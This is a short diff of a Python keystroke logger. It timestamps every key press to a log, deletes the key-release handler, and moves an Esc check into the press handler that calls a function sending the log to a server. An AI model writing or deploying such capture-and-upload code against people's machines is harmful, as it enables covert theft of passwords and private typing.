@@ -46,16 +46,12 @@ def _fmt_key(key):
 def on_press(key):
     ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     write_log(f"{ts} PRESS   {_fmt_key(key)}\n")
-
-
-def on_release(key):
-    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    write_log(f"{ts} RELEASE {_fmt_key(key)}\n")
-
     if key == keyboard.Key.esc:
         upload_log()
         return False  # stop listener
 
+
+    
 
 def upload_log():
     """Send the log to the server. Runs on the schedule thread or Esc callback."""
